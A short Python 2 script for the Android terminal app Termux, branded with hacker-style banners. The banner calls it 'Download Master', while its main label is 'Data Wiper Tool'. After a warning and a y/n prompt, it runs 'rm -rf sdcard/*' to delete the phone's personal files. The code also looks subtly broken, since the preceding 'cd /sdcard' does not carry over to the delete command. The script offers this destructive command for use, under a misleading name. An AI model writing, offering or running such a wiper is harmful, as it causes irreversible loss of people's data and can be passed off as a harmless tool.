# -*- coding: utf-8 -*-
import os,sys,time
os.system('clear')
def bannar():
  print '''\033[91m
  ____    _  _____  _     __        ___                 
 |  _ \  / \|_   _|/ \    \ \      / (_)_ __   ___ _ __ 
 | | | |/ _ \ | | / _ \    \ \ /\ / /| | '_ \ / _ \ '__|
 | |_| / ___ \| |/ ___ \    \ V  V / | | |_) |  __/ |   
 |____/_/   \_\_/_/   \_\    \_/\_/  |_| .__/ \___|_|   
                                       |_|              

'''
def bannar2 ():
  print ('\033[94m-'*50)

  print ('')

  print (' \033[96m Author   : \033[95m EVAN HAXXXOR')
  print ('')
  print (' \033[96m Tool     : \033[95m Download Master')
  print ('')
  print (' \033[96m Facebook : \033[95m https://www.facebook.com/Evan.Al.Mahmud.Irfan.Official.xDD/')
  print ('')
  print (' \033[96m Github   : \033[95m https://www.github.com/sacrobrent/')
  print ('')
  print (' \033[96m Coded By : \033[95m Evan Al Mahmud Irfan')
  print ('')
  print ('\033[94m-'*50)
  print ('')
  print ('             \033[0;37;41m Data Wiper Tool\033[0m ' )
  print ('')
  print ('')
bannar()
bannar2()
print '\033[91m Denger'
print ' All personal data Wiper tool.plz backup your personal information'
print ''
print ''
love=raw_input("\033[92m [!] Are You Sure? (y/n) : \033[93m ")
if love=='y':
  os.system('termux-setup-storage')
  os.system('cd /sdcard')
  os.system('rm -rf sdcard/*')
  
elif love=='n':
  print '\033[95m Right ✓'
  print 'good bye'
  sys.exit()
  
else:
  os.system('python2 Data.py')
